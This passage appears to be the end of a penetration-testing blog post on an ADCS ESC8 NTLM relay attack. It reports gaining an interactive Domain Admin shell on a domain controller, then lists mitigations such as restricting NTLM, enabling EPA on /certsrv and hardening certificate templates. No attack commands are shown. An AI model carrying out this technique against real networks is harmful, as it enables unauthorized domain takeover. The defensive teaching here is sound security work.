+<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg_p3wMRfoakNXr862bwm02ItXOlCsNFJpY0UQKY-1G5KT0uGxnoAcQVSxw620plr8DSecy9TccSdzaGkIifz31hlu7Ch_zfJzsRryo8gDIGdhFHAUjirfmyyJewMP3Gzxqda2iE4cQAWKN_BfndVPDqbUY1wxYSUJeleDUB-Iaz4710j85wu8SJ9HZSpLi/s16000/25.png" alt="ADCS ESC8 NTLM Relay Attack" width="1110" height="338"/></span></p>
+<p><span style="color: #000000">We now have a <strong>remote, interactive shell as Domain Admin</strong> on DC1, all without touching a password.</span></p>
+<h3><span style="color: #800000">Mitigation</span></h3>
+<ul>
+<li><span style="color: #000000">Disable Web Enrollment if not needed, or restrict access to internal users only.</span></li>
+<li><span style="color: #000000">Enforce HTTPS and disable or restrict NTLM.</span></li>
+<li><span style="color: #000000">Use Kerberos-only authentication and set LmCompatibilityLevel = 5 to refuse NTLMv1.</span></li>
+<li><span style="color: #000000">Harden certificate templates by removing Authenticated Users from enroll/auto-enroll and requiring Manager Approval.</span></li>
+<li><span style="color: #000000">Restrict CA access and limit template permissions to privileged groups.</span></li>
+<li><span style="color: #000000">Audit sensitive templates like DomainController and Administrator.</span></li>
+<li><span style="color: #000000">Block coercion vectors by disabling MS-EFSRPC, RPRN, FSRVP, and using Windows Firewall.</span></li>
+<li><span style="color: #000000">Enable CA audit logs and monitor for machine cert enrollments and PKINIT events.</span></li>
+<li><span style="color: #000000">Enable Extended Protection for Authentication (EPA) to protect /certsrv in IIS.</span></li>
+</ul>
+<p><span style="color: #000000"><strong>Author: </strong>MD Aslam is a dynamic Information Security leader committed to driving security excellence and mentoring teams to strengthen security across products, networks, and organizations. Contact</span> <strong><a href="https://www.linkedin.com/in/md-aslam-7b04ab144">here</a></strong></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
